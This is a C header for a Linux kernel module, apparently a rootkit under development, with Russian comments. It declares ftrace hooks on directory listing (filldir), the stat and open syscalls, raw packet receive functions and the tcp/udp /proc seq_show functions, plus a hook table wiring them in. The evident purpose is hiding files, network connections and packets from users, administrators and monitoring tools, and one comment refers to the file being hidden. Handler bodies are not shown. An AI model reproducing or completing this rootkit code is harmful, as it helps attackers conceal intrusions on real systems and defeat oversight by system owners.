#ifndef HOOKS_H
#define HOOKS_H

#include <linux/dirent.h>       // struct linux_dirent64
#include <linux/sched.h>        // struct task_struct
#include <linux/fdtable.h>      // struct files_struct, struct fdtable
#include <linux/fs.h>           // struct file, struct inode, struct super_block, struct file_system_type
#include <linux/dcache.h>       // struct dentry
#include <linux/limits.h>       // PATH_MAX


#include <linux/delay.h>		// msleep

#include <net/inet_sock.h>				// struct inet_sock
#include <linux/inet.h>					// in4_pton()
#include <linux/ipv6.h> 				// inet6_sk()
#include <uapi/linux/uio.h>				// struct iovec
#include <uapi/linux/netlink.h>			// struct nlmsghdr
#include <uapi/linux/inet_diag.h>		// struct inet_diag_msg
#include <uapi/linux/sock_diag.h> 		// SOCK_DIAG_BY_FAMILY
#include <linux/socket.h>				// struct user_msghdr

#include <linux/ip.h>				// ip_hdr()
#include <linux/ipv6.h>				// ipv6_hdr()


struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

struct Extended_array {
    void* array_addr;
    int array_size;
};

// ------------------------------- filldir ----------------------------------------
static bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
static bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);

static bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
static bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);


// static asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
// static asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
// --------------------------------------------------------------------------------

// ------------------------------- stat -------------------------------------------
static asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
static asmlinkage long ex_sys_stat(struct pt_regs *regs);

static asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);
static asmlinkage long ex_sys_lstat(struct pt_regs *regs);

static asmlinkage long (*real_sys_newstat)(struct pt_regs *regs);
static asmlinkage long ex_sys_newstat(struct pt_regs *regs);

static asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs);
static asmlinkage long ex_sys_newlstat(struct pt_regs *regs);

static asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs);
static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs);

static asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
static asmlinkage long ex_sys_statx(struct pt_regs *regs);
// --------------------------------------------------------------------------------

// ------------------------------- open -------------------------------------------
// не до конца сделано. надо изменять название скрываемого файла
static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
static asmlinkage long ex_sys_open(struct pt_regs *regs);

static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
static asmlinkage long ex_sys_openat(struct pt_regs *regs);

static asmlinkage long (*real_sys_openat2)(struct pt_regs *regs);
static asmlinkage long ex_sys_openat2(struct pt_regs *regs);
// --------------------------------------------------------------------------------


// --------------------------------------------------------------------------------
// подключения
// static asmlinkage long (*real_sys_recvfrom)(struct pt_regs *regs);
// static asmlinkage long ex_sys_recvfrom(struct pt_regs *regs);

// static asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
// static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);

// --------------------------------------------------------------------------------

// ------------------------------- socket -----------------------------------------
// packet_rcv packet_rcv_spkt tpacket_rcv linux-source-6.11/net/packet/af_packet.c
// struct sk_buff - linux-headers-6.11.2-common/include/linux/skbuff.h

static int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
static int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

static int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
static int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

static int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

static asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);

static asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);

static asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);

static asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
// --------------------------------------------------------------------------------



#define SYSCALL_NAME(name) ("__x64_" name)

#define SYS_HOOK(_name, _function, _original)	\
	{					\
		.name = SYSCALL_NAME(_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

#define HOOK(_name, _function, _original)	\
	{					\
		.name = (_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

static struct ftrace_hook EX_hooks[] = {
	HOOK("filldir64", ex_filldir64, &real_filldir64),
	HOOK("filldir", ex_filldir, &real_filldir),


	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),

	// !sys_stat64 sys_lstat64 ??
	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),

	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),

	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),

	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),

	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
};

#endif
